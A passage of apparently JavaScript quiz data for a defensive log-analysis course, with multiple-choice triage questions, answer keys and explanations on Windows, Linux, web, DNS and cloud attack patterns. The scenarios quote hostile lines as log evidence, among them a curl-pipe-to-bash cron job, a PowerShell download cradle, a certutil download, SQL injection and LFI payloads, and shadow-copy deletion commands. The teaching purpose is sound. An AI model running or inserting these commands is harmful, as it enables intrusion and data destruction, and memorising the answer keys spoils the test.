            "Routine console login — ignore.",
            "Network logon (Type 3) over NTLM at 02:47 from a different subnet — possible lateral movement / pass-the-hash. Investigate the source host and check 4768/4769 on the DC.",
            "Service account login — normal.",
            "Scheduled task (Type 4) — benign.",
          ],
          correctAnswer: 1,
          explanation: "Logon Type 3 = network logon (SMB/WMI). NTLM at odd hours from an unusual source is a hallmark of lateral movement. Pivot to the source host's 4648 (explicit credentials) and the DC's 4769 (TGS) for Kerberoasting/PtH context."
        },
        {
          id: "la-q2-2",
          difficulty: "easy",
          tags: ["EID 4625", "Brute Force"],
          scenario: "Domain Controller security log shows in 90 seconds:\n  4625 Account=admin  SubStatus=0xC000006A  Source=203.0.113.77   ×42\n  4625 Account=root   SubStatus=0xC0000064  Source=203.0.113.77   ×31\n  4625 Account=test   SubStatus=0xC0000064  Source=203.0.113.77   ×28",
          question: "What attack pattern is this?",
          options: [
            "Single user mistyping their password.",
            "Password spraying / brute force from a single source — note 0xC0000064 (user does not exist) vs 0xC000006A (wrong password); mix of both = enumeration plus guessing.",
            "Kerberoasting — request for service tickets.",
            "Golden Ticket forgery.",
          ],
          correctAnswer: 1,
          explanation: "0xC0000064 = unknown user (enumeration); 0xC000006A = bad password against a real user. High volume + multiple accounts + one source IP = brute force / spray. Containment: block source, alert IR, check for any 4624 success from the same IP."
        },
        {
          id: "la-q2-3",
          difficulty: "medium",
          tags: ["EID 4688", "Process Creation"],
          scenario: "EID 4688 on FIN-HR-04:\n  NewProcessName=C:\\Windows\\System32\\cmd.exe\n  ParentProcessName=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n  CommandLine=cmd /c powershell -enc JABzAD0ATgBlAHcA...",
          question: "Triage call?",
          options: [
            "Benign — Word often launches cmd for macros.",
            "High-confidence malicious: Office spawning cmd → encoded PowerShell is a textbook maldoc execution chain (T1566.001 → T1059.003). Isolate the host, capture the parent .docx, hunt the encoded payload across the fleet.",
            "Low priority — encoded PowerShell is normal in enterprises.",
            "Ignore — 4688 is too noisy to trust.",
          ],
          correctAnswer: 1,
          explanation: "WINWORD.EXE → cmd.exe → powershell -enc is one of the most reliable malicious patterns in Windows telemetry. Decode the base64 payload offline (don't execute) to confirm C2 / downloader behavior."
        },
        {
          id: "la-q2-4",
          difficulty: "medium",
          tags: ["Sysmon EID 1", "LOLBin"],
          scenario: "Sysmon Event ID 1:\n  Image=C:\\Windows\\System32\\certutil.exe\n  CommandLine=certutil -urlcache -split -f http://185.234.x.x/x.exe C:\\Users\\Public\\x.exe\n  ParentImage=C:\\Windows\\System32\\cmd.exe",
          question: "What is happening?",
          options: [
            "Certificate maintenance — benign.",
            "LOLBin abuse: certutil is being used as a file downloader (T1105 Ingress Tool Transfer). Block, isolate, hunt the URL and the dropped binary across the fleet.",
            "Windows Update activity.",
            "PKI enrollment.",
          ],
          correctAnswer: 1,
          explanation: "certutil -urlcache -split -f <url> is a classic Living-Off-the-Land Binary download technique. Real PKI workflows never look like this. Hunt for the dropped binary's hash and any subsequent execution."
        },
        {
          id: "la-q2-5",
          difficulty: "medium",
          tags: ["EID 7045", "Persistence"],
          scenario: "System log on a Domain Controller:\n  EID=7045  ServiceName=AdobeUpdater_x86  ServiceFileName=cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://...')\n  AccountName=LocalSystem",
          question: "Verdict?",
          options: [
            "Legitimate Adobe update.",
            "Malicious service installation for persistence (T1543.003). Adobe never installs a SYSTEM service that runs IEX from a URL. Stop the service, remove, capture the binary, and hunt 7045 with similar patterns fleet-wide.",
            "Normal SCCM behavior.",
            "Group Policy push.",
          ],
          correctAnswer: 1,
          explanation: "EID 7045 with a PowerShell download-cradle as the service binary = classic persistence (T1543.003). Critical on a DC — escalate to IR immediately and check for similar entries on every host."
        },
        {
          id: "la-q2-6",
          difficulty: "medium",
          tags: ["EID 4672", "Privilege"],
          scenario: "EID 4672 (Special privileges assigned) fires on a workstation for the account 'helpdesk_temp' which is NOT in any admin group per AD.",
          question: "Most likely cause?",
          options: [
            "4672 is informational — ignore.",
            "Token manipulation or local admin assignment outside AD (T1134 / T1078). Verify the account's local group membership on the host, check recent 4732 (member added to local group) events.",
            "MFA prompt.",
            "Group Policy refresh.",
          ],
          correctAnswer: 1,
          explanation: "4672 means SeDebug / SeTakeOwnership / SeTcb etc. were granted at logon. If AD says non-admin but 4672 fires, the host has a local admin assignment or the token was elevated. Pair with 4732/4720 to find when it happened."
        },
        {
          id: "la-q2-7",
          difficulty: "medium",
          tags: ["EID 4720", "Account Creation"],
          scenario: "On a member server (not a DC) at 03:22:\n  4720 New account 'svc_backup2' created\n  4732 svc_backup2 added to local Administrators\n  4624 Type 10 (RDP) from 10.7.7.7 by svc_backup2  at 03:25",
          question: "What is this?",
          options: [
            "Sysadmin maintenance.",
            "Attacker creating a local admin for persistence + remote access (T1136.001 + T1078.003). Disable the account, kill the RDP session, isolate the host, hunt 10.7.7.7 fleet-wide.",
            "Backup software installation.",
            "Domain join.",
          ],
          correctAnswer: 1,
          explanation: "Local-admin creation followed by immediate RDP from an internal IP is a textbook persistence + lateral movement pattern. Don't just disable — preserve evidence and find how 10.7.7.7 itself was compromised."
        },
        {
          id: "la-q2-8",
          difficulty: "hard",
          tags: ["Sysmon EID 3", "C2"],
          scenario: "Sysmon Event ID 3 (network connect):\n  Image=C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe\n  DestinationIp=185.234.x.x  DestinationPort=443  Initiated=true\nFiring every 58–62 seconds for the last 6 hours.",
          question: "Best classification?",
          options: [
            "Browser keepalive.",
            "Suspected C2 beacon — regular interval, binary in user Temp, external IP. Pull the binary for sandboxing, hunt the IP/domain across proxy + DNS, isolate the host.",
            "Windows telemetry.",
            "Antivirus update.",
          ],
          correctAnswer: 1,
          explanation: "Periodic outbound from a user-writable Temp directory to a non-corporate IP is a textbook beacon. Even on 443 (TLS) the timing pattern (jitter ±2s around 60s) is the giveaway. JA3 fingerprinting on the proxy confirms."
        },
        {
          id: "la-q2-9",
          difficulty: "hard",
          tags: ["EID 1102", "Anti-Forensics"],
          scenario: "Security log shows:\n  EID 1102 'The audit log was cleared'  SubjectUserName=Administrator  Time=04:01\nNo prior 4634 (logoff) for that admin session.",
          question: "Response?",
          options: [
            "Standard maintenance, ignore.",
            "Treat as active intrusion — 1102 is anti-forensics (T1070.001). Pull the central SIEM copy (which the attacker can't reach), identify the logon session that issued the clear, isolate, and start IR.",
            "Re-enable auditing and continue normal ops.",
            "Reboot the server.",
          ],
          correctAnswer: 1,
          explanation: "1102 by a non-routine account is one of the highest-fidelity 'adversary on the box' signals. The SIEM has the central copy — that's why we ship logs off-host. Pivot to the originating session (4624 Type 10 / Type 3) just before 04:01."
        },
        {
          id: "la-q2-10",
          difficulty: "hard",
          tags: ["Kerberos", "4769"],
          scenario: "On the DC:\n  Many 4769 (TGS request) events from workstation WKS-22 for service names like MSSQLSvc/db01.corp:1433, HTTP/sp01.corp, CIFS/file01.corp, all with TicketEncryptionType=0x17 (RC4-HMAC).",
          question: "What attack is most likely?",
          options: [
            "Normal service usage.",
            "Kerberoasting (T1558.003) — bulk TGS requests using RC4 so the tickets can be cracked offline for service-account passwords. Identify the requesting user, force a rotation of those service-account passwords, and migrate to AES + gMSA.",
            "Golden Ticket use.",
            "Pass-the-Hash.",
          ],
          correctAnswer: 1,
          explanation: "RC4 (etype 0x17) TGS for many SPNs from one workstation is the Kerberoasting signature. Long-term fix: AES-only, group Managed Service Accounts, and long random passwords for SPN-bearing accounts."
        },
    ]
  },
  {
    quizId: "la-q3",
    courseId: "log-analysis",
    title: "Linux & Network Log Investigation",
    description: "Triage SSH, sudo, web, firewall, DNS, and proxy logs across realistic Linux/network scenarios.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
        {
          id: "la-q3-1",
          difficulty: "easy",
          tags: ["auth.log", "SSH"],
          scenario: "/var/log/auth.log on web-edge-02:\n  Jun15 02:11 sshd[2231]: Failed password for invalid user oracle from 45.9.x.x port 51422 ssh2\n  Jun15 02:11 sshd[2232]: Failed password for invalid user postgres from 45.9.x.x port 51424 ssh2\n  Jun15 02:11 sshd[2233]: Failed password for invalid user admin from 45.9.x.x port 51426 ssh2\n  ... 800+ lines in 4 minutes ...",
          question: "What is this and what is the FIRST correct mitigation?",
          options: [
            "Misconfigured monitoring — ignore.",
            "SSH brute force / user enumeration from a single IP — block the IP at the edge (or fail2ban), confirm no 'Accepted' lines for the same source, then audit SSH config (disable password auth, key-only, restrict source).",
            "DDoS — call the ISP.",
            "Routine vulnerability scan from your own team.",
          ],
          correctAnswer: 1,
          explanation: "'invalid user' = the username doesn't exist (enumeration). Block at the edge (cheap) before tuning. Critically, grep the same IP for 'Accepted password' — any success means the brute force already worked."
        },
        {
          id: "la-q3-2",
          difficulty: "easy",
          tags: ["sudo", "Privilege Abuse"],
          scenario: "/var/log/auth.log:\n  Jun15 04:02 host01 sudo: jdoe : TTY=pts/1 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/cat /etc/shadow",
          question: "Verdict?",
          options: [
            "Routine admin task.",
            "Privilege abuse / credential access (T1003.008). cat /etc/shadow is rarely legitimate — preserve the file, confirm jdoe's role, check for subsequent file transfer / hashcat usage, treat as IR.",
            "Backup operation.",
            "Patching.",
          ],
          correctAnswer: 1,
          explanation: "Reading /etc/shadow grabs hashed passwords for offline cracking. Even with sudo rights, no normal workflow needs this. Look for what jdoe did next (scp, base64, pastebin) and any new 'Accepted' SSH sessions after."
        },
        {
          id: "la-q3-3",
          difficulty: "medium",
          tags: ["Web Logs", "Web Attacks"],
          scenario: "Apache access.log:\n  198.51.100.4 - - [15/Jun/2026:08:14:22 +0000] \"GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 200 18422\n  198.51.100.4 - - [15/Jun/2026:08:14:23 +0000] \"GET /products?id=1%27%20UNION%20SELECT%20null,version()-- HTTP/1.1\" 200 19102\n  198.51.100.4 - - [15/Jun/2026:08:14:25 +0000] \"GET /products?id=1%27;%20SELECT%20*%20FROM%20users-- HTTP/1.1\" 200 27310",
          question: "What attack is in progress, and what does the 200 status code tell you?",
          options: [
            "XSS — and 200 means it was blocked.",
            "SQL injection (T1190). 200 = the server returned content for every payload — the app is responding, not blocking, and response sizes are GROWING (18k → 19k → 27k) which suggests data is being extracted. WAF gap.",
            "Path traversal.",
            "CSRF.",
          ],
          correctAnswer: 1,
          explanation: "URL-decoded payloads (' OR '1'='1, UNION SELECT, ;SELECT * FROM users) = classic SQLi. 200 + growing body size is a strong indicator the queries are succeeding and exfiltrating rows. Action: block IP, enable WAF rule, code review of /products."
        },
        {
          id: "la-q3-4",
          difficulty: "medium",
          tags: ["Firewall", "Port Scan"],
          scenario: "Firewall syslog:\n  10.6.1.77 → 10.6.1.10:22 SYN  denied\n  10.6.1.77 → 10.6.1.10:23 SYN  denied\n  10.6.1.77 → 10.6.1.10:80 SYN  denied\n  10.6.1.77 → 10.6.1.10:443 SYN  denied\n  10.6.1.77 → 10.6.1.10:445 SYN  denied\n  ... (sequential ports 1-65535 in 12s) ...",
          question: "What is this and what makes the source notable?",
          options: [
            "External scan from the internet — ignore.",
            "Internal port scan (T1046 Network Service Discovery) from 10.6.1.77 — an internal host scanning. Investigate WHY an internal box is scanning peers; treat as possible post-compromise discovery.",
            "Asset management tool.",
            "Backup traffic.",
          ],
          correctAnswer: 1,
          explanation: "Internal-to-internal scans are far more concerning than internet noise — they almost always mean a host is already compromised and the attacker is enumerating the segment. Confirm with asset-mgmt records before assuming malice, then isolate."
        },
        {
          id: "la-q3-5",
          difficulty: "medium",
          tags: ["DNS", "DNS Tunneling"],
          scenario: "DNS server query log for one client (5 min):\n  a1b2c3d4e5.exfil.attacker.tld TXT\n  f6g7h8i9j0.exfil.attacker.tld TXT\n  k1l2m3n4o5.exfil.attacker.tld TXT\n  ... 1,200 unique subdomains, all TXT, all to *.exfil.attacker.tld ...",
          question: "What is this pattern?",
          options: [
            "Normal CDN behavior.",
            "DNS tunneling / exfil (T1071.004 / T1048.003) — long random subdomains, single parent domain, TXT records carry the payload. Sinkhole the domain, isolate the client, capture the process making queries.",
            "DNSSEC validation.",
            "ANY-record amplification.",
          ],
          correctAnswer: 1,
          explanation: "High entropy in subdomain labels + a single parent + TXT (large response capacity) is the canonical DNS-tunnel signature. Tools: dnscat2, iodine. Sinkhole the parent at the resolver; pivot to EDR for the process."
        },
        {
          id: "la-q3-6",
          difficulty: "medium",
          tags: ["Proxy", "C2 / Beaconing"],
          scenario: "Squid proxy log filtered for one client over 6 hours:\n  Every 60 ±3 seconds: GET http://185.234.x.x/api/poll  302  227 bytes  user-agent=curl/7.85.0",
          question: "Interpretation?",
          options: [
            "Browser polling for mail.",
            "Beaconing C2 — fixed jitter, raw IP host, tiny consistent response, non-browser UA. Block the URL, isolate the client, hunt the UA + IP fleet-wide.",
            "Software update check.",
            "NTP traffic.",
          ],
          correctAnswer: 1,
          explanation: "Beacon traits present: regular interval with small jitter, suspicious destination (IP not domain), atypical UA (curl from a user host), tiny response body for control channel. Even on port 80/443 the timing exposes it."
        },
        {
          id: "la-q3-7",
          difficulty: "medium",
          tags: ["Web Logs", "LFI/RCE"],
          scenario: "Nginx access log:\n  GET /index.php?page=../../../../etc/passwd  200  3214\n  GET /index.php?page=php://filter/convert.base64-encode/resource=config  200  4011",
          question: "What two techniques are visible?",
          options: [
            "Only directory listing.",
            "Local File Inclusion (../../etc/passwd) and PHP wrapper abuse to base64-exfiltrate the config — both T1083 (File Discovery) escalating to T1005 (Data from Local System). Patch the include, restrict open_basedir, rotate any secrets in the config.",
            "SQLi only.",
            "SSRF only.",
          ],
          correctAnswer: 1,
          explanation: "Classic LFI plus the php://filter wrapper to bypass PHP rendering and dump source/config. 200 on both = success. Any DB creds, API keys, or JWT secrets in the leaked config must be considered compromised."
        },
        {
          id: "la-q3-8",
          difficulty: "hard",
          tags: ["Linux", "Persistence"],
          scenario: "On a Linux web server, recent additions found by an audit:\n  /etc/cron.d/sysupd: */5 * * * * root curl -s http://185.234.x.x/s | bash\n  ~/.ssh/authorized_keys gained a new entry: ssh-rsa AAAA... attacker@op\n  /etc/systemd/system/upd.service runs /tmp/.x every boot",
          question: "Best summary?",
          options: [
            "Routine system updates.",
            "Three persistence mechanisms (T1053.003 cron, T1098.004 SSH key, T1543.002 systemd) — assume the host is fully owned, rebuild from a known-good image, rotate all credentials/keys that touched it, and hunt the C2 IP fleet-wide.",
            "Backup configuration.",
            "Monitoring agent.",
          ],
          correctAnswer: 1,
          explanation: "Multiple independent persistence channels = the attacker assumed they'd be evicted and planted redundancy. Cleanup is not enough — rebuild. Don't forget any SSH keys this host trusted outbound, and any service tokens stored on it."
        },
        {
          id: "la-q3-9",
          difficulty: "hard",
          tags: ["Web Logs", "Recon"],
          scenario: "Web access log shows from a single IP:\n  GET /.git/config  404\n  GET /.env  200\n  GET /backup.zip  200\n  GET /admin/  401\n  GET /wp-login.php  404\n  GET /phpmyadmin/  404",
          question: "What is this and which response is the WORST news?",
          options: [
            "Random noise — all responses non-200.",
            "Content discovery / sensitive-file probe — the 200 on /.env (likely leaks DB creds, API keys) and on /backup.zip (likely a full source/db dump) are the critical findings; rotate everything those files exposed and restrict the web root.",
            "DDoS attempt.",
            "SEO crawler.",
          ],
          correctAnswer: 1,
          explanation: ".env and backup archives in the web root are catastrophic exposures — they leak production secrets in plaintext. 200 means the attacker got them. Rotate every credential, key, and token in those files immediately and audit access logs for the same IP elsewhere."
        },
        {
          id: "la-q3-10",
          difficulty: "hard",
          tags: ["Correlation", "Multi-source"],
          scenario: "Same user, three logs, 30 seconds apart:\n  VPN: jdoe authenticated from 185.x.x.x (Country: RU)\n  Okta: jdoe MFA push approved (Country: RU)\n  Email: jdoe rule created — forward all mail to ext@attacker.tld + auto-delete",
          question: "Verdict and priority action?",
          options: [
            "Legitimate travel — no action.",
            "Account takeover + mail-forwarding exfil (T1078 + T1114.003). Kill all sessions, force credential + MFA-factor reset, remove the forwarding rule, search sent items and audit logs, notify the user out-of-band, and check what mailboxes jdoe could access.",
            "Phishing test by IT.",
            "MFA fatigue — ignore.",
          ],
          correctAnswer: 1,
          explanation: "Foreign auth followed within seconds by a hidden forwarding rule is the signature of business-email-compromise. Removing the rule is necessary but not sufficient — the attacker may have created OAuth app grants, inbox rules at the folder level, or alternate MFA devices."
        },
    ]
  },
  {
    quizId: "la-q4",
    courseId: "log-analysis",
    title: "Attack Pattern Recognition in Logs",
    description: "Identify multi-stage attack patterns — lateral movement, beaconing, exfiltration, ransomware staging — from log evidence.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q4-1",
          difficulty: "medium",
          tags: ["Lateral Movement", "SMB"],
          scenario: "From host A (10.4.2.55) in 90 seconds:\n  10.4.2.55 → 10.4.2.10:445 SMB  Tree connect to ADMIN$\n  10.4.2.55 → 10.4.2.10:445 SMB  Write file: PSEXESVC.exe\n  10.4.2.10 EID 7045 ServiceName=PSEXESVC  ServiceFileName=%SystemRoot%\\PSEXESVC.exe\n  10.4.2.10 EID 4624 LogonType=3 Account=admin SourceNetworkAddress=10.4.2.55",
          question: "What technique is this and what is the right containment?",
          options: [
            "Normal file share usage.",
            "Lateral movement via PsExec (T1021.002 / T1569.002). Isolate both A and the target, kill the service, hunt for the admin credential source on A, and check every other host A talked to on 445.",
            "Backup operation.",
            "Group Policy push.",
          ],
          correctAnswer: 1,
          explanation: "ADMIN$ write of PSEXESVC + a matching 7045 + a 4624 Type 3 with admin creds = PsExec lateral movement. Critical question is HOW host A got admin creds (LSASS dump? Mimikatz? cached creds?) — that's the real start of the chain."
        },
        {
          id: "la-q4-2",
          difficulty: "medium",
          tags: ["Beaconing", "Timing Analysis"],
          scenario: "Proxy log for one workstation, plotted by minute:\n  Connections to a single external host arrive at 00, 60, 120, 180 ... seconds with ±3s jitter, 24h continuous, 24-byte payloads.",
          question: "Strongest single indicator that this is C2 beaconing rather than legitimate polling?",
          options: [
            "The destination is HTTPS.",
            "The combination of fixed interval, tiny payload, and 24h continuity with no human-driven variance — legitimate polling has gaps (sleep, lunch, weekends) and variable payloads.",
            "It's port 443.",
            "The host is a Mac.",
          ],
          correctAnswer: 1,
          explanation: "Humans create natural gaps; software beacons don't. Continuous 24h periodicity with tiny payloads is the timing fingerprint of C2 (Cobalt Strike, Sliver, Empire). Pair with destination-reputation and JA3 for high confidence."
        },
        {
          id: "la-q4-3",
          difficulty: "medium",
          tags: ["Exfiltration", "DLP"],
          scenario: "Egress sensor:\n  Host 10.5.6.7 → drive.attacker.tld over 4h transferred 14 GB outbound\n  Same host shows 100MB/day average for the previous 30 days",
          question: "Best characterization?",
          options: [
            "Backup misconfiguration.",
            "Data exfiltration (T1048 / T1567) — 140× baseline egress to a new destination. Isolate, identify the user/process, snapshot the host, notify legal/IR, and determine WHAT data the host could access.",
            "Software update.",
            "Cloud sync — benign.",
          ],
          correctAnswer: 1,
          explanation: "Baselines are king. 140× normal egress + new external destination is a near-certain exfil. The follow-up question — 'what could that host reach?' — drives the breach scope and any required disclosures."
        },
        {
          id: "la-q4-4",
          difficulty: "medium",
          tags: ["Ransomware", "Staging"],
          scenario: "EDR + file telemetry on a file server in 6 minutes:\n  vssadmin delete shadows /all /quiet\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} recoveryenabled No\n  Followed by mass file renames: *.docx → *.docx.<random>",
          question: "What stage of what attack is this?",
          options: [
            "Routine backup cleanup.",
            "Ransomware staging + encryption (T1490 Inhibit System Recovery + T1486 Data Encrypted for Impact). Isolate the file server NOW, fail over to last clean backup, pull the encryptor binary for IR.",
            "Disk defrag.",
            "OS upgrade.",
          ],
          correctAnswer: 1,
          explanation: "Shadow-copy deletion + boot-config tamper + mass rename to random extensions is the canonical pre-encryption + encryption sequence. Speed matters — every minute is more files lost. The encryptor is usually still resident; capture it before reboot."
        },
        {
          id: "la-q4-5",
          difficulty: "medium",
          tags: ["Credential Theft", "LSASS"],
          scenario: "Sysmon Event ID 10 (process access):\n  SourceImage=C:\\Users\\jdoe\\AppData\\Local\\Temp\\proc.exe\n  TargetImage=C:\\Windows\\System32\\lsass.exe\n  GrantedAccess=0x1410",
          question: "Interpretation?",
          options: [
            "Routine antivirus scan.",
            "Credential dumping attempt against LSASS (T1003.001). 0x1410 includes PROCESS_VM_READ — the binary is trying to read LSASS memory (Mimikatz / procdump style). Isolate, capture proc.exe, force a credential rotation for anyone logged on.",
            "Windows Update.",
            "EDR self-protection.",
          ],
          correctAnswer: 1,
          explanation: "Non-EDR process touching LSASS with VM_READ is one of the highest-confidence credential-theft signals. Anyone whose session was active on that host must rotate creds, and any service tickets the host held are suspect."
        },
        {
          id: "la-q4-6",
          difficulty: "hard",
          tags: ["Living Off the Land", "Discovery"],
          scenario: "On a freshly compromised workstation, in the first 8 minutes:\n  whoami /all\n  net user /domain\n  net group \"Domain Admins\" /domain\n  nltest /dclist:corp.local\n  ipconfig /all\n  arp -a\n  tasklist /svc\n  systeminfo",
          question: "What stage and what tools?",
          options: [
            "Routine helpdesk diagnostics.",
            "Post-exploitation discovery (T1087 Account Discovery, T1018 Remote System Discovery, T1082 System Information Discovery) using only native binaries — Living-Off-the-Land. No malware needed, no AV alert. Detect by sequence/burst behavior, not by binary reputation.",
            "Phishing payload.",
            "Backup script.",
          ],
          correctAnswer: 1,
          explanation: "Each command alone is benign — admins run them. The TELL is that they're all run in seconds, by the same user, on a workstation that never normally does this. Detection rule: 5+ discovery commands within 2 minutes by a non-admin → alert."
        },
        {
          id: "la-q4-7",
          difficulty: "hard",
          tags: ["Persistence", "Scheduled Task"],
          scenario: "EID 4698 (scheduled task created):\n  TaskName=\\Microsoft\\Windows\\AppCompat\\PolicyConverter\n  TaskContent=...<Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc JABzAD0A...</Arguments></Exec>...\n  Trigger: <LogonTrigger>",
          question: "Why is the task name notable, and what is this?",
          options: [
            "Microsoft installed it — ignore.",
            "Persistence via Scheduled Task (T1053.005). The name impersonates a real Microsoft task path (defense evasion / masquerading T1036.005). Logon-triggered encoded PowerShell — disable the task, capture the encoded payload, hunt the task name pattern fleet-wide.",
            "Driver update.",
            "Group Policy.",
          ],
          correctAnswer: 1,
          explanation: "Attackers love task names under \\Microsoft\\Windows\\... because hurried analysts assume they're legit. Always validate against a clean baseline of Microsoft-shipped tasks and decode any encoded PowerShell payload."
        },
        {
          id: "la-q4-8",
          difficulty: "hard",
          tags: ["Cloud", "IAM Abuse"],
          scenario: "AWS CloudTrail in 4 minutes:\n  CreateAccessKey  user=Alice  by=Alice\n  PutUserPolicy  user=Alice  policy={\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\n  AssumeRole  role=OrgAdmin  source=185.x.x.x (new IP, new region)",
          question: "What happened?",
          options: [
            "Normal admin work.",
            "Cloud account takeover / privilege escalation (T1078.004 + T1098.001) — new access key, self-granted * permissions, role assumption from a new geography. Disable the user, revoke keys, audit every action that key took, rotate any secrets it could read.",
            "AWS internal maintenance.",
            "MFA enrollment.",
          ],
          correctAnswer: 1,
          explanation: "Key creation + self-applied admin-equivalent policy + new-geo AssumeRole is a classic cloud-compromise chain. The blast radius is whatever * allowed — assume worst case until proven otherwise. CloudTrail + S3 data events + GuardDuty are the pivot points."
        },
        {
          id: "la-q4-9",
          difficulty: "hard",
          tags: ["Phishing", "Initial Access"],
          scenario: "Mail gateway → EDR chain in 90 seconds:\n  Mail: from=hr@partner-co.tld  subject='Updated invoice'  attachment=invoice.html (HTML smuggling)\n  Browser: user opens invoice.html which writes setup.iso to Downloads\n  Mount: setup.iso mounted as E:\\ — contains shortcut.lnk + hidden script.bat\n  Process: explorer.exe → wscript.exe E:\\script.bat → powershell -enc ...",
          question: "Best classification of the initial access technique?",
          options: [
            "Drive-by download.",
            "Phishing with HTML smuggling + ISO container (T1566.001 / T1027.006). The ISO bypasses Mark-of-the-Web on older Windows, hiding the LNK→script chain. Block the sender, hunt the ISO hash, kill the PowerShell, and consider a fleet rule that flags ISO mounts from user Downloads.",
            "Watering hole.",
            "Supply chain.",
          ],
          correctAnswer: 1,
          explanation: "HTML-smuggling delivery + ISO/IMG container is the dominant 2023-2025 initial-access pattern (Qakbot, BumbleBee, IcedID). Detection requires correlating mail → browser write → mount → script execution, which is why mail-only or EDR-only views miss it."
        },
        {
          id: "la-q4-10",
          difficulty: "hard",
          tags: ["Kill Chain", "Storytelling"],
          scenario: "Reviewing 14 days of logs after detection, you assemble:\n  Day 1: phishing email with macro (T1566.001)\n  Day 1: macro runs PowerShell, beacons to 185.x.x.x (T1059.001 + T1071)\n  Day 3: Mimikatz on workstation (T1003.001)\n  Day 5: PsExec to fileserver (T1021.002)\n  Day 7: scheduled task persistence on 4 hosts (T1053.005)\n  Day 12: vssadmin delete + mass file encryption (T1490 + T1486)",
          question: "Which artifact is the highest-priority root-cause finding for the post-incident report?",
          options: [
            "The encryption event on Day 12.",
            "The phishing email on Day 1 — the initial access vector. Everything else is downstream; fixing macro execution policy + user training + better mail filtering breaks future intrusions earlier. Day 12 is the impact, not the cause.",
            "The PsExec event on Day 5.",
            "The scheduled task on Day 7.",
          ],
          correctAnswer: 1,
          explanation: "Post-incident reports drive prevention investment. The initial access vector (Day 1 phishing macro) is the single highest-leverage control point — block it and the rest of the chain never starts. The other events inform detection improvements, not prevention."
        },
    ]
  },
  {
    quizId: "la-q5",
    courseId: "log-analysis",
    title: "Log Analysis Tools, Queries & Best Practices",
    description: "CLI triage (grep/awk/jq), Splunk SPL, ELK KQL, and operational best practices for production log analysis.",
    passingScore: 80,
    timeLimit: 25,
    questions: [
        {
          id: "la-q5-1",
          difficulty: "easy",
          tags: ["CLI", "grep/awk"],
          scenario: "On a Linux box (no SIEM access), you need the top 10 source IPs by failed-SSH count from /var/log/auth.log over 1M lines.",
          question: "Which pipeline is correct and idiomatic?",
          options: [
            "cat auth.log | wc -l",
            "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10",
            "tail -f auth.log",
            "cp auth.log /tmp/",
          ],
          correctAnswer: 1,
          explanation: "Standard CLI triage: filter (grep) → extract field (awk; $(NF-3) is the source IP in the default sshd Failed-password format) → count (sort | uniq -c) → rank (sort -rn) → top N (head). Works on any UNIX without extra tooling."
        },
        {
          id: "la-q5-2",
          difficulty: "easy",
          tags: ["jq", "JSON"],
          scenario: "An EDR streams JSON one-per-line. You want the count of unique processes (process.name) where event.action='process_create' in the last 100k lines of /var/log/edr.json.",
          question: "Best jq pipeline?",
          options: [
            "jq '.process'",
            "tail -n 100000 /var/log/edr.json | jq -r 'select(.event.action==\"process_create\") | .process.name' | sort -u | wc -l",
            "cat /var/log/edr.json | grep process",
            "awk '{print $1}' /var/log/edr.json",
          ],
          correctAnswer: 1,
          explanation: "jq -r 'select(...) | .field' is the canonical way to filter + project structured JSON. Always tail-bound to keep one-shot triage fast on multi-GB files."
        },
        {
          id: "la-q5-3",
          difficulty: "medium",
          tags: ["Splunk SPL", "Detection"],
          scenario: "You need a Splunk search that returns users with ≥5 failed logins followed by 1+ success within 10 minutes from the same source IP.",
          question: "Which structure is correct?",
          options: [
            "index=auth | stats count",
            "index=auth EventCode IN (4624,4625) | stats count(eval(EventCode=4625)) AS fails count(eval(EventCode=4624)) AS success values(EventCode) AS codes by user, src_ip, _time span=10m | where fails>=5 AND success>=1",
            "index=auth | sort _time",
            "index=auth | dedup user",
          ],
          correctAnswer: 1,
          explanation: "The eval-inside-stats pattern is the standard SPL way to count conditionally across event types. span=10m bins time; by user+src_ip groups the triage unit. The where clause is the alert condition. The other answers don't express the multi-condition correlation."
        },
        {
          id: "la-q5-4",
          difficulty: "medium",
          tags: ["KQL", "Detection"],
          scenario: "Microsoft Sentinel / Defender KQL: 'lsass.exe accessed by a non-Microsoft-signed process in the last 24h'.",
          question: "Which query best matches?",
          options: [
            "SecurityEvent | take 10",
            "DeviceProcessEvents | where Timestamp > ago(24h) | where InitiatingProcessFileName !endswith \".exe\" or InitiatingProcessSignatureStatus != \"Signed\" | join DeviceEvents on $left.DeviceId == $right.DeviceId | where ActionType == \"OpenProcess\" and FileName =~ \"lsass.exe\"",
            "SigninLogs | summarize count()",
            "Heartbeat | where TimeGenerated > ago(24h)",
          ],
          correctAnswer: 1,
          explanation: "Approximate, but it shows the correct pattern: time bound + signature filter on the initiator + join on device + the lsass target. Real prod rules add allowlists for EDR/AV agents. The other answers don't touch process telemetry."
        },
        {
          id: "la-q5-5",
          difficulty: "medium",
          tags: ["Best Practice", "Parsing"],
          scenario: "A vendor pushes a major log-format change in the next maintenance window. Your detections rely on extracted fields.",
          question: "Lowest-risk way to handle this?",
          options: [
            "Apply the change in prod over the weekend and hope for the best.",
            "Ingest the new format to a test/dev SIEM tier first, validate every affected parser + detection, then promote — keep the old parser as a fallback for the rolling cutover window.",
            "Pause all logging during the change.",
            "Delete all old detections.",
          ],
          correctAnswer: 1,
          explanation: "Treat parsers like code: dev → test → prod with a rollback. Vendor format changes are the single most common cause of silent detection failures (rules look healthy but match nothing)."
        },
        {
          id: "la-q5-6",
          difficulty: "medium",
          tags: ["Detection Hygiene", "False Positives"],
          scenario: "A 'mass file access' detection fires 200×/day, 95% from one backup agent (svc_backup) on backup hosts during 22:00–02:00.",
          question: "Best response?",
          options: [
            "Disable the rule.",
            "Tune: add an allowlist for svc_backup ON the known backup hosts during the backup window, keep the rule firing for everyone/everywhere else. Document the exclusion in the rule comments.",
            "Lower the threshold.",
            "Ignore the alerts manually.",
          ],
          correctAnswer: 1,
